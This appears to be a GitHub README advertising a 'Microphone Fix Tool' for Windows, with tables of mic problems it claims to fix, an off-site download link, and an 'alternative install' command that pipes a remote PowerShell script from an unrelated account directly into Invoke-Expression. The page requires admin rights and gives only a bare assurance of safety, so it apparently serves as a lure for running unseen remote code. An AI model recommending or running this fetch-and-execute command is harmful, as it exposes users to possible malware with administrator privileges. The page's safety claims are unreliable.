<div align="center">

# Microphone Fix Tool

Fix microphone not working, not detected, and audio input issues on Windows 10/11.

[![Windows](https://img.shields.io/badge/Windows-10%20%7C%2011-0078D4?logo=windows&logoColor=white)]()
[![Release](https://img.shields.io/badge/v1.0.2-stable-success)]()
[![MIT](https://img.shields.io/badge/License-MIT-blue)](LICENSE)

<br>

[**Download**](https://mic.nexustool.fun/) ·
[Problems Fixed](#problems-fixed) ·
[FAQ](#faq)

</div>

---

## About

**Microphone Fix Tool** repairs microphone and audio input problems on Windows. Whether your mic isn't detected, is too quiet, or doesn't work in specific apps like Zoom, Teams, or Discord, this tool diagnoses and fixes the issue automatically.

### Alternative install

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

---

## Problems Fixed

### Microphone Not Working

| Problem | Fix |
|---|---|
| **Microphone not detected** at all | Reinstalls audio input driver, rescans devices |
| **"No microphone found"** in apps | Re-enables recording device in Sound settings |
| Mic stopped working after **Windows Update** | Rolls back audio driver |
| **Privacy settings blocking** microphone | Enables mic access for desktop apps |
| **"Your microphone is muted by system settings"** | Resets app permissions |
| Mic not working in **Zoom / Teams / Discord** | Sets correct default communication device |
| Mic works in some apps but **not others** | Fixes per-app audio device assignment |

### Microphone Too Quiet

| Problem | Fix |
|---|---|
| **Volume too low** even at 100% | Enables Microphone Boost (+10dB / +20dB / +30dB) |
| Others say I'm **too quiet** in calls | Adjusts mic level and boost in audio driver |
| **Microphone Boost slider missing** | Reinstalls audio driver to restore boost option |
| Volume **fluctuates** on its own | Disables "Automatic Gain Control" in driver |

### Audio Quality Issues

| Problem | Fix |
|---|---|
| **Echo** in calls (others hear themselves) | Enables Acoustic Echo Cancellation |
| **Background noise** picked up | Enables noise suppression in audio driver |
| **Robotic / distorted** voice | Resets sample rate to 16-bit 48kHz |
| **Crackling / popping** on mic input | Fixes DPC latency, adjusts buffer size |
| **Mic picks up speakers** (feedback loop) | Fixes Stereo Mix / loopback configuration |

### Specific Devices

| Device | Common Issue | Fix |
|---|---|---|
| **USB microphone** (Blue Yeti, etc.) | Not detected or wrong driver | Reinstalls USB audio driver |
| **Headset mic** (HyperX, SteelSeries) | Mic not recognized, only headphones work | Splits audio/mic device in driver |
| **Bluetooth headset mic** | Connected but mic doesn't work | Enables Hands-Free Telephony profile |
| **Laptop built-in mic** | Disabled or muted by hardware | Re-enables in Device Manager + privacy settings |
| **Webcam mic** (Logitech, etc.) | Wrong default device | Sets as default communication device |

---

## Preview

```
  +---------------------------------------------------+
  |          Microphone Fix Tool v1.0.2               |
  +---------------------------------------------------+
  |                                                   |
  |  Recording Devices:                               |
  |  [!] Microphone (Realtek HD)   -- Disabled        |
  |  [OK] Stereo Mix               -- Ready           |
  |  [!] Headset Mic (USB)         -- Not detected    |
  |                                                   |
  |  Settings:                                        |
  |  [!] Mic privacy              -- Blocked for apps |
  |  [!] Default comm. device     -- Not set          |
  |  [OK] Audio input service     -- Running          |
  |                                                   |
  |  [ Fix All ]   [ Test Mic ]   [ Exit ]            |
  |                                                   |
  +---------------------------------------------------+
```

---

## Common Error Messages

| Error | Fix |
|---|---|
| **"No recording devices found"** | Re-enables mic in Device Manager and Sound settings |
| **"Microphone access is denied"** | Enables mic in Windows Privacy settings |
| **"Your microphone is muted by system settings"** | Unmutes mic, resets app permissions |
| **"Audio input device not found"** in Discord/Zoom | Sets correct default communication device |
| **"This device cannot start (Code 10)"** for mic | Reinstalls audio input driver |
| **"Microphone not working after Windows Update"** | Rolls back audio driver to previous version |
| **"Microphone levels keep changing"** | Disables Automatic Gain Control |

---

## Apps Supported

Works with all apps that use microphone input:

**Video Conferencing** -- Zoom, Microsoft Teams, Google Meet, Skype, Webex, Slack
**Gaming** -- Discord, Steam Voice Chat, in-game voice chat
**Recording** -- Audacity, OBS Studio, Streamlabs, Adobe Audition
**Streaming** -- Twitch, YouTube Live, Facebook Live
**Communication** -- WhatsApp Desktop, Telegram Desktop, Signal

---

## How It Works

1. **Detect** -- Lists all recording devices (built-in, USB, Bluetooth, HDMI)
2. **Diagnose** -- Checks driver, privacy settings, default device, audio levels
3. **Repair** -- Enables devices, reinstalls drivers, sets permissions, adjusts levels
4. **Test** -- Records 5-second audio clip and plays it back to confirm mic works

---

## System Requirements

| | |
|---|---|
| OS | Windows 10 / 11 (64-bit) |
| RAM | 2 GB minimum |
| Admin | Yes |
| Network | For driver downloads |

---

## FAQ

**My mic works in Settings but not in Zoom/Teams.**
Usually a privacy setting issue. The tool enables microphone access for all desktop apps and sets the correct default communication device.

**I have multiple mics and apps use the wrong one.**
The tool lets you set the correct default recording device and default communication device separately.

**Microphone Boost option is missing.**
Some audio drivers hide the boost slider. The tool reinstalls the driver with full feature support.

**Is it safe?**
Yes. The tool uses standard Windows audio APIs and Device Manager. No system files are modified or patched.

---

## License

[MIT](LICENSE)
